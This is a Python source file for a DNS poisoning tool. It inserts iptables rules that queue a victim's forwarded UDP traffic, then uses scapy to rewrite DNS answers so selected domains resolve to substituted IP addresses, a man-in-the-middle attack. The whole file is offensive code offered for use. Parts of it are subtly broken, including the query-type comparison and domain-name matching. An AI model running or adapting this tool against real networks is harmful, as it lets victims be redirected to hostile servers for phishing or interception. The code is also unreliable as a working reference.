from scapy.all import *
from netfilterqueue import NetfilterQueue
import multiprocessing
import os

class DnsPoisoner(multiprocessing.Process):

    def __init__(self, ip_victim, queue_num):

        multiprocessing.Process.__init__(self)

        self.urls_to_spoof = {}
        self.queue         = NetfilterQueue()    #Library capable of handling IP packets
        self.iprule_add    = "iptables -I FORWARD -p udp -d {} -j NFQUEUE --queue_num {}".format(ip_victim, queue_num)
        self.iprule_remove = "iptables -D FORWARD -p udp -d {} -j NFQUEUE --queue_num {}".format(ip_victim, queue_num)
        self.exit          = False

        self.queue.bind(queue_num, self.handle_packet)

    def add_url(self, url, ip):
        self.urls_to_spoof[url] = ip

    def handle_packet(self, packet_nfqueue):

        packet_scapy = IP(packet_nfqueue.get_payload())
        
        if packet_scapy.haslayer(DNSRR):
            packet_scapy = self.edit_dnsrr(packet_scapy)
            packet_nfqueue.set_payload(bytes(packet_scapy))

        packet_nfqueue.accept()

    def edit_dnsrr(self, packet):

        if packet[DNSQR].qname in self.urls_to_spoof.keys():
            
            if packet[DNSQR].qtype == "A":
                packet[DNSRR].rdata = self.urls_to_spoof[packet[DNSQR].qname]
            
            if packet[DNSQR].qtype == "AAAA":
                pass # TODO

        return packet

    def run(self):

        os.system(self.iprule_add)
        self.queue.run()

        while not self.exit:
            time.sleep(1)

        self.queue.unbind()

    def stop(self):

        os.system(self.iprule_remove)
        self.exit = True
